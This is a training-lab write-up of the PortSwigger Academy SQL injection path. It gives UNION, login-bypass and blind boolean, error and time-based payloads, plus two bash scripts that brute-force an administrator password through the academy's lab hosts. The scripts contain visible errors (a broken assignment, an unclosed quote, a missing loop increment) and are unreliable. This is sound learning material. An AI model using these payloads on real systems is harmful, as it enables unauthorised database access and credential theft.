---
layout: post
title: Portswigger Academy - SQL Injection
date: 2023-06-06 15:43:18 +0200
categories: [Portswigger Academy, Server-Side Topics]
tags: [SQL Injection, Write-up, Cheat Sheet]
img_path: /assets/img/labs/portswigger/sql-injection/
image:
  path: sql-injection.png
---

## Info

This is my write-up for the *SQL Injection* learning path at the Portswigger Academy.\
The reason for this write-up is to have a cheat-sheet or some go-to notes for myself.\
Probably I've found flags in a different way than intended (with or without the use of BurpSuite), and not always in the order of learning path.

[Portswigger Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)

## LAB : SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This is an easy one. Just navigate to a category, and SQL Inject the GET query.\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' OR 1=1--`

## LAB : SQL injection vulnerability allowing lobin bypass

This one can be done by passing a SQL Injection in the *password* field of the login form.

- Username: `administrator`
- Password: `' or 1=1--`

## LAB : SQL injection UNION attack, determining the number of columns returned by the query

This can also be done by injecting the SQL injection straight into the GET query of the URL.

First we need to check how many columns the original query returns, and match those.\
Start off with one *NULL* and keep adding until you don't get an error anymore.\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL,NULL--`

Now we know we need to return 3 columns in our injection, we need to find a column that can contain a string.\
Again, start with trying the first column, and move further untill you don't get an error anymore.\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,'abc',NULL--`


## LAB : SQL injection UNION attack, retrieving data from other tables

Building on the previous lab. First check how many columns we need to return:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL--`

Check which columns can contain strings (and where you see the 1st column, and where the 2nd):\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT 'abc','xyz'--`

Now we can print all usernames with their passwords as a new item:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT username,password FROM users--`

## LAB : SQL injection attack, querying the database type and version on Oracle

Trying what we did in the previous 2 labs doesn't work here. No matter how many *NULL*s we add, we keep getting errors:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL,NULL--`

That's because in this case there's no MS-SQL as backend. But an Oracle database (as suggested in the title of the lab)\
For Oracle DB's we have to do the following:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL FROM dual--`

Now that this doens't return an error, we can actually check which database type we are dealing with:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,banner FROM v$version--`


## LAB : SQL injection attack, querying the database type and version on MySQL and Microsoft

Going back to the basics, on trying to figure out how many columns need to be returned by the injection, all attempts failed.\
Both the normal `UNION SELECT NULL,NULL,NULL--` as well as the previous `UNION SELECT NULL,NULL,NULL FROM dual--`.\
Looking at the SQL Injection cheat sheet, referred to in the lab, it shows that for MySQL you need to use the *#* to force exit a query statement.\
However, trying this directly in the browser didn't work either... So... Welcome BurpSuite.

Intercept the request to show the items in a certain category. And modify the GET call:\
`GET /filter?category=Pets'+UNION+SELECT+NULL,NULL#`\
`GET /filter?category=Pets'+UNION+SELECT+'abc','xzy'#`\
`GET /filter?category=Pets'+UNION+SELECT+'abc',@@version#`


## LAB : SQL injection attack, listing the database contents on non-Oracle databases.

The lab tells us that it's not an Oracle database, so first things first, let's try to find the number of columns we need to return; and which can contain strings:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL--`\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT 'abc','xyz'--`

We now know that we have two string columns, one for the title, one for the body. Let's see which tables exist in the database:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT 'existing tables',Table_Name FROM information_schema.tables--`

In here, we see an interesting table *users_whjefl* (your's might be a different random string). Next up, see which colums exist in this table:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT 'existing columns',Column_Name FROM information_schema.columns WHERE Table_Name='users_whjefl'--`

And also here, we find 2 interesting column names. One for the usernames, one for the passwords. Now we can extract all the user info:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT username_jdlmjy,password_pdopfu FROM users_whjefl--`

With the usernames and passwords returned, we can login as the administrator on this website. 


## LAB : SQL injection attack, listing the database content on Oracle

As the title of the lab mentions, this time we're facing an Oracle database, thus including the *FROM dual* in our initial attack:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT NULL,NULL FROM dual--`

And same as the previous one, let's find an interesting table, and see which columns it has:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT 'tables',table_name FROM all_tables--` \
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT 'columns',column_name FROM all_tab_columns WHERE table_name='USERS_SBEZQS'--`

Now list all users and their passwords from the table we just found, and use it to login as the administrator:\
`https://xxxxxx.web-security-academy.net/filter?category=Pets' UNION SELECT USERNAME_PKXGKN,PASSWORD_RDHBUO FROM USERS_SBEZQS--`


## LAB : Blind SQL injection with conditional responses

The lab description tells us that the SQL Injection vulnerability is in the cookie. While this can be exploited directly in the browser, via the developer tools, I find it easier to make use of BurpSuite for this one.\
Intercept a request to the lab in BurpSuite, and send the request to repeater.\
In the request itself, we can see the cookie, and can modify it from here:\
`Cookie: TrackingId=4qq9peoK98lxFHKV; session=xxxxxxx`\
If we just send this message, we get a *Welcome Back* message.

To see if the cookie is vulnerable to SQL Injections, we try a few small things:\
`Cookie: TrackingId=4qq9peoK98lxFHKV'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;No *Welcome Back* message\
`Cookie: TrackingId=4qq9peoK98lxFHKV' OR '1'='1; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Welcome Back* message\
`Cookie: TrackingId=4qq9peoK98lxFHKV' AND '1'='2; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;No *Welcome Back* message\
`Cookie: TrackingId=' OR 1=1 OR '1'='2; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Welcome Back* message (This one is important because now we don't have to worry about the TrackingId itself, and the quotes in the *1=1* middle part.)

Let's see if there's a *users* table, and an *administrator* account:\
`Cookie: TrackingId=' OR (SELECT COUNT(Table_Name) FROM information_schema.tables WHERE Table_Name='users')=1 OR '1'='2; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Welcome Back* message, so the *users* table exists.\
`Cookie: TrackingId=' OR (SELECT COUNT(username) FROM users WHERE username='administrator')=1 OR '1'='2; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Welcome Back* message, so the *administrator* user exists, and the column name is just *username*.

Time to iterate the password. First let's get the password length:\
`Cookie: TrackingId=' OR (SELECT LENGTH(password) FROM users WHERE username='administrator')>0 OR '1'='2; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Welcome Back* message, so the *password* column is correct, and has a value of more than 0\
`Cookie: TrackingId=' OR (SELECT LENGTH(password) FROM users WHERE username='administrator')=1 OR '1'='2; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;No *Welcome Back* message. Thus the password **does not** have a size of 1.\
...\
`Cookie: TrackingId=' OR (SELECT LENGTH(password) FROM users WHERE username='administrator')=20 OR '1'='2; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Welcome Back* message. Meaning we have a password with a length of 20 characters.

Now it's time to do a grind...\
For each character we have to figure out its value. One...by...one...\
Just showing it for the first character, and repeat this 19 more times.\
Since we don't know if the password is only lower case, or also upper case, numbers, special chars,... this require some guess work:\
`Cookie: TrackingId=' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'0' OR '1'='2; session=xxxxxxx`\
`Cookie: TrackingId=' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'A' OR '1'='2; session=xxxxxxx`\
`Cookie: TrackingId=' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'a' OR '1'='2; session=xxxxxxx`\
`Cookie: TrackingId=' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'m' OR '1'='2; session=xxxxxxx`\
`Cookie: TrackingId=' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)>'p' OR '1'='2; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;No *Welcome Back* message. So the first char should be somewhere between *m* and *p*.\
`Cookie: TrackingId=' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='o' OR '1'='2; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*Welcome Back* message. So the first char is the letter *o*. 

Carry on with the 2nd character:\
`Cookie: TrackingId=' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),2,1)>'0' OR '1'='2; session=xxxxxxx`\
...\
`Cookie: TrackingId=' OR SUBSTRING((SELECT password FROM users WHERE username='administrator'),2,1)='u' OR '1'='2; session=xxxxxxx`

And the 3rd, 4th... 20th. To get the full password of the administrator. And use it to login.


## LAB : Blind SQL injection with conditional errors

Same as previous lab, the cookie is vulnerable. Intercept the request in burp, send it to repeater, and try some small things with the cookie to see what works:\
`Cookie: TrackingId=abKX6i4aODjyEqti; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Just a regular type-200 returned.\
`Cookie: TrackingId=abKX6i4aODjyEqti'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;We get a 500 internal server error. Thus the query it used in the backend is malformed (now there will be an extra single quote that causes the error)\
`Cookie: TrackingId=abKX6i4aODjyEqti''; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;200 => we can do string manipulation.\
`Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT '')||'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;500 => Strange, I expected this to work\
`Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT '' FROM dual)||'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;200 => Never assume it's a MS-SQL/MySQL database. In this case it's an oracle DB.

Time to find the users table and the administrator user:\
`Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT '' FROM FakeTable WHERE ROWNUM = 1)||'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;500 => Good, was just a quick test\
`Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT '' FROM users WHERE ROWNUM = 1)||'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;200 => *users* table exists.\
`Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT '' FROM users WHERE username='administrator')||'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;200 => *administrator* user exists.

On to the password:\
`Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT '' FROM users WHERE username='administrator' AND LENGTH(password)>0)||'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;200 => *password* column is correct, and the administrator has a password with a length more than 0.\
`Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT '' FROM users WHERE username='administrator' AND LENGTH(password)=1)||'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;200 => Password length is 1???\
`Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT '' FROM users WHERE username='administrator' AND LENGTH(password)=2)||'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;200 => Hmm... not good. Both queries are indeed valid queries. We need to be able to generate an error if our request for the password length is correct.\
`Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT CASE WHEN (LENGTH(password)>0) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'; session=xxxxxxx`\
`Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT CASE WHEN (LENGTH(password)<0) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;First one gives *500*, second one gives *200*. Which is when we want. So when our result is correct, it tries to return the character of the numeric value of (1/0). And dividing by zero gives an error.\
`Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT CASE WHEN (LENGTH(password)=1) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;200 => Password length is not 1.\
...\
`Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT CASE WHEN (LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;500 => Password length is again 20.

Let's try and get the first character of the password. (Do note that Oracle DB uses *SUBSTR* not *SUBSTRING*)\
`Cookie: TrackingId=abKX6i4aODjyEqti'||(SELECT CASE WHEN (SUBSTR(password,1,1) > 'a') THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;200 => First char is a lower letter, bigger than *a*.

Not going to do every character by hand again, like previous lab. \
I built a quick and dirty (emphasis on the dirty) script for it:\
```bash
#!/bin/bash

URL="https://xxxxxxxx.web-security.academy.net/"
COOKIE="TrackingId=abKX6i4aODjyEqti"
PWLEN=20
CHARSET = "a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9"

echo
i=0
while [ $i -lt $PWLEN ]; do
   for c in $CHARSET; do
      let j=$i+1
      PAYLOAD="'||(SELECT CASE WHEN (SUBSTR(password,"$j",1) = '"$c"') THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator')||'"
      status=$(curl -s -o /dev/null -w "%{http_code}" --cookie "${COOKIE}${PAYLOAD}" $URL)
      if [[ $status -eq 500 ]]; then
         echo -n $c
         break
      fi
   done
   let i=$i+1
done
echo
echo
```
{: .nolineno }


Change the URL and the COOKIE to the correct values, and let it run. It will output the password character by character.


## LAB : Visible error-based SQL injection

Intercept the request with Burp and send it to repeater. Perform a small few tests to see if it's vulnerable:\
`Cookie: TrackingId=4LDaIRSVfjxfOGQJ; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;regular page, nothing to see, nothing to expect.\
`Cookie: TrackingId=4LDaIRSVfjxfOGQJ'; session=xxxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This gives us a nice error: *Unterminated string literal started at position 52 in SQL SELECT \* FROM tracking WHERE id = '4LDaIRSVfjxfOGQJ''. Expected char*

I tried several other injections, but I ran into the limited number of allowed characters in the cookie.\
Removing the actual tracking number (which we don't need, as we will generate a SQL query error anyway) helped a bit.\
`Cookie: TrackingId=' or CAST((SELECT password FROM users LIMIT 1) AS int)='1; session=xxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error: *invalid input syntax for type integer: "xxxxxxxxxxxxxxxxx"*. And this is the administrator's password.


## LAB : Blind SQL injection with time delays

Intercept the request with Burp, and send it to the repeater. Perform a small few tests to see if and how it's vulnerable:\
I tried a lot of things, including the *'; IF...* and the *' UNION SELECT IF...* examples from the academy page, as well as the *'|| some statement ||'* from previous labs. Nothing worked.\
Then it hit me: *Never assume; always check*\
`Cookie: TrackingId='||(SELECT CASE WHEN(1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'; session=xxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;It was a bloody PostgreSQL database... Just forward it to the browser; lab solved.


## LAB : Blind SQL injection with time delays and information retrieval

Intercepted the request with Burp, send it to repeater, and performed some small tests to see if and how it's vulnerable. With the troubles from last lab, I started with the PostgreSQL examples:\
`Cookie: TrackingId=ZPKYQ5PLgLPLTkXm'%3b+SELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--; session=xxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Got a delay of about 10 seconds in the response. So the case works, because 1=1 is indeed correct.

On to the username and password grind:
`Cookie: TrackingId=ZPKYQ5PLgLPLTkXm'%3b+SELECT+CASE+WHEN+(SUBSTRING(password,1,1)+>+'a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username%3d'administrator'--; session=xxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Gave a delay of 10 seconds, so the first char of the administrator password is a lower letter.

`Cookie: TrackingId=ZPKYQ5PLgLPLTkXm'%3b+SELECT+CASE+WHEN+(LENGTH(password,1,1)+=+20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username%3d'administrator'--; session=xxxxxx`\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10 sec delay => password has a length of 20.

Not looking forward to the manual grind. So let's get dirty in bash:\
```bash
#!/bin/bash

URL="https://xxxxxxxxxx.web-security-academy.net/"
COOKIE="TrackingId=z"
PWLEN=20
CHARSET="a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z"

echo
i=0
while [ $i -lt $PWLEN]; do
   for c in $CHARSET; do
      let j=$i+1
      PAYLOAD="'%3b+SELECT+CASE+WHEN+(SUBSTRING(password,${j},1)+=+'${c}')+THEN_pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username%3d'administrator'--"
      req_start=$(date +"%s")
      status=$(curl -s -o /dev/null -w "%{http_code}" --cookie "${COOKIE}${PAYLOAD} $URL)
      req_end=$(date +"%s")
      let diff=${req_end}-${req_start}
      if [[ $diff > 3 ]]; then
         echo -n $c
         break
      fi
   done
done
echo
echo
```
{: .nolineno }

Setting the correct URL, running the script, shows the administrator's password. Use it to login. Done


## LAB: Blind SQL injection with out-of-band interaction

>This can only be done with BurpSuite Premium, which I don't have.\
Will update this if I every have it.
{: .prompt-info }


## LAB: Blind SQL injection with out-of-band data exfiltration

>This can only be done with BurpSuite Premium, which I don't have.\
Will update this if I every have it.
{: .prompt-info }


## Credits

Header image by [flaticon](https://www.flaticon.com/free-icons/hacking)


